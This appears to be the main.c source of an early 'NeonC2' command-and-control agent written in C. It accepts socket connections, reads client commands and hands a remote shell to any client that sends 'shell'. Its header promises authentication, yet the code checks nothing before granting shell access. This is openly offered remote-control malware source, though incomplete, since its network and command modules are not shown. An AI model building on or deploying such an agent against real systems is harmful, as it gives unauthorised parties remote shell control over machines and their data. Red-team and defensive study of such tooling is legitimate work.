/**
 * 
 * main.c
 * this program acts as the central hub for the agent's features.
 * it brings together the network communication and the system executions features
 * the first stage of this program is meant to receie and auhtenticate command requests,
 * executes them and respond to the data stream with the command output.
 * the first stage will be single-threaded, but future stages will be multi-threaded
 * 
 * Author: JJDSEC
 * Date: 2025-08-31
 * 
 */

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "cmd.h"
#include "net.h"

#define version "alpha-1" // Define the version of the agent

bool run_tests();
void callback_netclient(int client_socket);

int main(int argc, char *argv[]) {
    printf("Starting NeonC2 Agent...\n");
    if (argc > 1 && strcmp(argv[1], "--version") == 0) {
        printf("NeonC2 Agent Version %s\n", version);
        return EXIT_SUCCESS; // Exit successfully if version is requested
    }

    if (!run_tests()) // Run tests for cmd and net features
        return EXIT_FAILURE;

    if (!net_init(callback_netclient)) { // Initialize network communication
        fprintf(stderr, "❌ Failed to initialize network communication.\n");
        return EXIT_FAILURE;
    }
    printf("✅ Network communication initialized successfully.\n");

    return EXIT_SUCCESS; // Exit successfully if everything is initialized
}


bool run_tests() {
    // Test cmd feature
    if (!test_cmd_feature()) {
        fprintf(stderr, "❌ Command feature tests failed.\n");
        return false;
    }
    printf("✅ Command feature tests passed.\n");

    // Test net feature
    if (!test_net_feature()) {
        fprintf(stderr, "❌ Network feature tests failed.\n");
        return false;
    }
    printf("✅ Network feature tests passed.\n");

    return true; // All tests passed
}

void callback_netclient(int client_socket) {
    printf("--- Connection estbalished on socket %d ---\n", client_socket);

    // establish connection with the client
    send(client_socket, "WELCOME", strlen("WELCOME"), 0); // Send authentication code

    while (true) {
        // receive data from the client
        char buffer[1024] = {0};
        ssize_t bytes_read = read(client_socket, buffer, sizeof(buffer) - 1);
        if (bytes_read < 0) {
            perror("read failed");
            close(client_socket);
            return;
        }
        else if (bytes_read == 0) {
            printf("Client disconnected.\n");
            close(client_socket);
            return;
        }

        if (strncmp(buffer, "exit", 4) == 0) {
            printf("Client requested to exit. Closing connection.\n");
            close(client_socket);
            return;
        }

        if (strncmp(buffer, "shell", 5) == 0) {
            printf("Client requested to open shell. Forwarding.\n");
            cmd_shell(client_socket);
        }

        // this is the part where I execute commands

        printf("Replying to client...\n");
        const char *reply = "Message successfully processed.";
        send(client_socket, reply, strlen(reply), 0);
    }
    
    printf("--- End of callback ---\n");
}